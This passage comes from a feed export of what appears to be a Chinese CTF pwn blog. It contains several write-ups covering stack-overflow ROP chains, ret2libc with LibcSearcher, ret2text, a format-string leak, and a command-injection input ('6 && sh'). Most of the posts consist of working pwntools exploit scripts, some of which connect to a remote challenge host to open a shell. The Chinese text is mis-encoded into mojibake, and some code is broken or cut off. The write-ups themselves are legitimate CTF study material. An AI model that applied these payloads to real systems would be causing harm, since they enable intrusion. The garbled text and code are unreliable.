å…¥åˆ°<code>buf[7]</code>é‡Œé¢,p2å‡½æ•°é‡Œçš„buféå¸¸å¤§,å¦‚æœåªæ˜¯<code>buf[7]</code>æ”¹æˆ127ä¼šæ— æ³•æº¢å‡º,ä½†æ˜¯å¦‚æœæ”¹æˆå¤§çš„æ•°å­—å°±å¯ä»¥ç‹ ç‹ åœ°æº¢å‡ºäº†.</p><p>æ„é€ å®Œæ ˆæº¢å‡ºæ¼æ´ä¹‹å,å› ä¸ºç¨‹åºçš„.pltæ²¡æœ‰<code>system()</code>,ä¹Ÿæ²¡æœ‰ç»™å‡ºglibcçš„ç‰ˆæœ¬,å°±éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ³„éœ²ç‰ˆæœ¬ç„¶åè°ƒç”¨<code>system(&quot;bin/sh&quot;)</code></p><p>è¿™é‡Œé¡ºä¾¿å¤ä¹ ä¸€ä¸‹æ­¥éª¤,è¿™é‡Œæ²¡å¼€PIEå°±ç›´æ¥ç”¨ELFæ–¹æ³•æ¥æ‰¾,æœ‰å¼€å°±å¾—æƒ³åŠæ³•æ³„éœ²å‡ºç¨‹åºçš„åŠ è½½åŸºåœ°å€ç„¶åå†è·å–æŸäº›åº“å‡½æ•°çš„.pltå’Œ.gotåœ°å€.</p><h3 id="1-è·å–ç¨‹åºä¸­æœ‰çš„å‡½æ•°çš„write-pltå’Œread-gotåœ°å€">(1) è·å–ç¨‹åºä¸­æœ‰çš„å‡½æ•°çš„write@pltå’Œread@gotåœ°å€</h3><p>è¿™é‡Œçš„<code>read()</code>ä¹Ÿå¯ä»¥æ˜¯åˆ«çš„å‡½æ•°,å®åœ¨æ²¡æœ‰å°±<code>__libc_start_main</code>ä¹Ÿæ˜¯å®Œå…¨okçš„,</p><p>ç”¨pltæ˜¯æ‹¿æ¥è¦†ç›–è¿”å›åœ°å€çš„,ç”¨gotåˆ™æ˜¯å› ä¸ºgotå­˜äº†libcå‡½æ•°çš„çœŸå®åœ°å€,å¯ä»¥æ‹¿å»ç»™åš<code>write()</code>çš„å‚æ•°.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0xdeadbeef</span> <span class="comment">#è¿™ä¸ªæ˜¯è¿”å›åœ°å€</span></span><br></pre></td></tr></table></figure><h3 id="2-æ„é€ ROPé“¾æ¥æ³„éœ²åº“å‡½æ•°çœŸå®åœ°å€">(2) æ„é€ ROPé“¾æ¥æ³„éœ²åº“å‡½æ•°çœŸå®åœ°å€</h3><p>ç”±äºè¿™é‡Œæ„é€ çš„æ˜¯32ä½ç¨‹åºçš„ROPé“¾,å¦‚æœæ˜¯64ä½çš„è¿˜éœ€è¦è·å¾—pop retç³»åˆ—çš„gadgets</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=cyclic(offset)+p32(write_plt)+p32(main)+p32(read_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">&quot;read_addr:&quot;</span><span class="built_in">hex</span>(read_addr))</span><br></pre></td></tr></table></figure><h3 id="3-æ³„éœ²glibcç‰ˆæœ¬å¹¶è·å–éœ€è¦å‡½æ•°çš„çœŸå®åœ°å€">(3) æ³„éœ²glibcç‰ˆæœ¬å¹¶è·å–éœ€è¦å‡½æ•°çš„çœŸå®åœ°å€</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lic=LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">info(<span class="string">&quot;system:&quot;</span>system)</span><br></pre></td></tr></table></figure><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;\0&#x27;</span>+<span class="number">6</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0xffffffff</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_plt=elf.elp</span><br></pre></td></tr></table></figure><h2 id="4">4.</h2><p>è¿™é¢˜è§£ä¸å‡ºæ¥æœ‰ä»¥ä¸‹å‡ ä¸ªçŸ¥è¯†ç‚¹</p><h3 id="1">(1)</h3><p>ä¸ç¡®å®š<code>strcmp()</code>åœ¨é‡åˆ°<code>'\0'</code>çš„æ—¶å€™ä¼šç›´æ¥åœæ­¢æ¯”è¾ƒæ¥è·³è¿‡,å®é™…ä¸Šæ˜¯ä¼šçš„</p><h3 id="2">(2)</h3><p>å¿˜è®°äº†é¢˜ç›®æ²¡å¼€PIEå¯ä»¥ç›´æ¥æ‹¿glibcçš„å‡½æ•°å…ˆretçš„</p><h3 id="3">(3)</h3><p>å¿˜è®°å†™æ³¨é‡Šå¯¼è‡´ç¬¬äºŒæ¬¡æ‰¾ä¸åˆ°çœŸæ­£æ”»å‡»çš„æ¼æ´æ˜¯ç¬¬äºŒä¸ªå‡½æ•°çš„elseåˆ¤æ–­.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-ä¼ªä»£ç &quot;&gt;1.ä¼ªä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>just test nc &amp;&amp; database Write Up</title>
    <link href="https://www.fomal.cc/posts/86c9736c.html"/>
    <id>https://www.fomal.cc/posts/86c9736c.html</id>
    <published>2023-04-02T03:02:22.716Z</published>
    <updated>2023-04-02T03:03:02.003Z</updated>
    
    <content type="html"><![CDATA[<p>1.ç”¨netcatè¿ä¸Šåœ°å€å°±èƒ½çœ‹åˆ°flag,catä¸€ä¸‹è·å–</p><p>2.å½“é€‰æ‹©6é€€å‡ºç³»ç»Ÿæ—¶,6å¯¹åº”çš„å‡½æ•°æœ‰å¾ˆä¸¥é‡çš„bug,ä¼šç”¨systemæ‰§è¡Œecho s,så°±æ˜¯è¾“å…¥çš„å‘½ä»¤,æˆ‘ä»¬åªéœ€è¦ç”¨&amp;&amp;åŒæ—¶è¾“å…¥å¤šæ¡å‘½ä»¤è°ƒç”¨shellå³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(command, <span class="string">&quot;echo %s&quot;</span>, s);</span><br><span class="line">system(command);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">6 &amp;&amp; sh   </span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">pwn</span><br><span class="line"><span class="built_in">cat</span> flag</span><br><span class="line">......</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.ç”¨netcatè¿ä¸Šåœ°å€å°±èƒ½çœ‹åˆ°flag,catä¸€ä¸‹è·å–&lt;/p&gt;
&lt;p&gt;2.å½“é€‰æ‹©6é€€å‡ºç³»ç»Ÿæ—¶,6å¯¹åº”çš„å‡½æ•°æœ‰å¾ˆä¸¥é‡çš„bug,ä¼šç”¨systemæ‰§è¡Œecho s,så°±æ˜¯è¾“å…¥çš„å‘½ä»¤,æˆ‘ä»¬åªéœ€è¦ç”¨&amp;amp;&amp;amp;åŒæ—¶è¾“å…¥å¤šæ¡å‘½ä»¤è°ƒç”¨shellå³å¯&lt;/p&gt;
&lt;figure c</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_level2_x64 WP</title>
    <link href="https://www.fomal.cc/posts/17a38a07.html"/>
    <id>https://www.fomal.cc/posts/17a38a07.html</id>
    <published>2023-04-02T03:02:22.714Z</published>
    <updated>2023-04-02T03:03:02.003Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬åœ°æ²¡æœ‰æ‰“é€š,å†™å¾—éå¸¸éš¾å—çš„ç®€å•é¢˜</p><h2 id="1-ä¼ªä»£ç ">1.ä¼ªä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000600A90                               public hint</span><br><span class="line">.data:0000000000600A90 2F 62 69 6E 2F 73 68 00       hint db &#x27;/bin/sh&#x27;,0</span><br><span class="line">.data:0000000000600A90                               _data ends</span><br></pre></td></tr></table></figure><h2 id="2-åˆ†ææ¼æ´">2.åˆ†ææ¼æ´</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>åªå¼€å¯äº†NXä¿æŠ¤å¹¶ä¸”æœ‰æ ˆæº¢å‡ºæ¼æ´,è€Œä¸”shift+f12ç”šè‡³å‘ç°.dataå­˜äº†<code>bin/sh</code>,ä¸è¿‡æœ¬åœ°è°ƒè¯•å¥½åƒæœ‰é—®é¢˜,å¥½åƒæ˜¯shellä¸åŒæ‰€ä»¥æ‰§è¡Œ<code>system()</code>çš„æ—¶å€™ç¨‹åºç›´æ¥ç»“æŸäº†,è¿™é‡Œæˆ‘ç”¨äº†ä¸´æ—¶æ›´æ¢shellçš„å‘½ä»¤ä¸è¿‡æ²¡åˆ‡è¿‡æ¥,æœ€åç”¨äº†IDAçš„åç§»é‡æ„é€ äº†payload,ç”±äºæ˜¯x64ç¨‹åº,æ‰€ä»¥è¿˜éœ€è¦æ‰¾åˆ°<code>pop rdi ret</code>çš„gadgetæ‰èƒ½ä¼ å‚,è¿™é‡Œç”¨ä¸Šäº†ROPgadget.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./level2_x64 | grep <span class="string">&#x27;pop rdi&#x27;</span></span><br><span class="line">0x00000000004006b3 : pop rdi ; ret</span><br></pre></td></tr></table></figure><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26459</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./level2_x64&#x27;) ##æœ¬åœ°å¦¹æœ‰æ‰“é€š</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x80</span>+<span class="number">0x8</span></span><br><span class="line">system=<span class="number">0x04004C0</span></span><br><span class="line">bin_sh=<span class="number">0x0600A90</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x4006B3</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æœ¬åœ°æ²¡æœ‰æ‰“é€š,å†™å¾—éå¸¸éš¾å—çš„ç®€å•é¢˜&lt;/p&gt;
&lt;h2 id=&quot;1-ä¼ªä»£ç &quot;&gt;1.ä¼ªä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_level2 1 WP</title>
    <link href="https://www.fomal.cc/posts/cb1b1517.html"/>
    <id>https://www.fomal.cc/posts/cb1b1517.html</id>
    <published>2023-04-02T03:02:22.712Z</published>
    <updated>2023-04-02T03:03:02.002Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ä¼ªä»£ç ">1.ä¼ªä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>åªå¼€å¯äº†NXä¿æŠ¤,åœ¨ä¼ªä»£ç é‡Œé¢å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†<code>system</code>å’Œ<code>read</code>,ç„¶åè¾“å…¥æœ‰æ ˆæº¢å‡ºæ¼æ´,ç›´æ¥æä¸€ä¸‹ret2libc1å°±å‡ºäº†,è¯•ç€æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰<code>bin/sh</code>æˆ–è€…<code>sh</code>çš„ç‰‡æ®µ,ç¬”è€…ç”¨pwntoolsçš„searchæ‰¾åˆ°äº†<code>sh</code>çš„ç‰‡æ®µ,ä¸è¿‡è¿™é‡Œå¦‚æœä¼ å…¥çš„æ˜¯<code>bin/sh</code>çš„åœ°å€ä¼šæ‰“ä¸é€š(è¿™æ¡ç›´æ¥åœ¨ç»ˆç«¯è¾“å…¥ä¹Ÿæ˜¯ä¼šæŠ¥å‡ºç›¸åŒçš„é”™è¯¯(å‘½ä»¤ä¸å­˜åœ¨)),ç¬”è€…ä¼ å…¥çš„æ˜¯<code>sh</code>å°±æ‰“é€šäº†.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x88</span>+<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read_addr=elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"></span><br><span class="line">system_addr=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bin_sh=<span class="built_in">next</span>(elf.search(<span class="string">b&#x27;sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(system_addr)+p32(<span class="number">6</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-ä¼ªä»£ç &quot;&gt;1.ä¼ªä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_level0 WP</title>
    <link href="https://www.fomal.cc/posts/60895f25.html"/>
    <id>https://www.fomal.cc/posts/60895f25.html</id>
    <published>2023-04-02T03:02:22.711Z</published>
    <updated>2023-04-02T03:03:02.002Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ä¼ªä»£ç ">1.ä¼ªä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">callsystem</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">512uLL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function(<span class="number">1LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>æƒ¯ä¾‹æ£€æŸ¥,å‘ç°æ˜¯éå¸¸åˆå§‹çš„ret2texté¢˜ç›®,ç›´æ¥æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€ä¸º<code>callsystem()</code>,å°±èƒ½è·å–shelläº†.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26917</span>)</span><br><span class="line">call_system=<span class="number">0x400596</span></span><br><span class="line">offset=<span class="number">0x80</span>+<span class="number">0x8</span></span><br><span class="line">payload=cyclic(offset)+p64(call_system)</span><br><span class="line">io.sendafter(<span class="string">&quot;Hello, World\n&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-ä¼ªä»£ç &quot;&gt;1.ä¼ªä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>hello there Write Up</title>
    <link href="https://www.fomal.cc/posts/6adfc2ee.html"/>
    <id>https://www.fomal.cc/posts/6adfc2ee.html</id>
    <published>2023-04-02T03:02:22.709Z</published>
    <updated>2023-04-02T03:03:02.001Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-æºä»£ç ">1.æºä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buffer_init(argc, argv, envp);</span><br><span class="line">  stream = fopen(<span class="string">&quot;./flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The flag file isn&#x27;t loading. Please contact an organiser if you are running this on the shell server.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">32</span>, stream);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What is your name?&quot;</span>);</span><br><span class="line">    fgets(format, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nHello there, &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ£€æŸ¥é˜²æŠ¤æªæ–½">2.æ£€æŸ¥é˜²æŠ¤æªæ–½</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h2 id="3-åˆ†ææ¼æ´">3.åˆ†ææ¼æ´</h2><p>å‘ç°æ˜¯64ä½æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´,åªéœ€è¦æˆ‘ä»¬æ³„éœ²ä¸€ä¸‹æ ˆä¸Šçš„å†…å­˜å°±å¯ä»¥è¾¾åˆ°ç›®çš„,ç”±äºæ˜¯63ä½ä¸çŸ¥é“åé¢çš„å‚æ•°ä¼šæ”¾åœ¨å“ªé‡Œ,é‚ç”¨pwndbgè¾“å…¥%6$p%7$pç­‰è¯•æ¢å‚æ•°çš„ä½ç½®,å‘ç°æ­¤æ—¶çš„streamå­—ç¬¦ä¸²(ä¹Ÿå°±æ˜¯flag)åˆšå¥½å­˜æ”¾åœ¨%6$p,å³printf()çš„ç¬¬7ä¸ªå‚æ•°,æ‰€ä»¥åªéœ€è¦æŠŠformatå¸ƒç½®æˆ%6$sè®¿é—®å³å¯è·å–flag.</p><h2 id="4-exp">4.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;/hellothere&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add=<span class="number">0x7fffffffddd0</span></span><br><span class="line"></span><br><span class="line">payload=<span 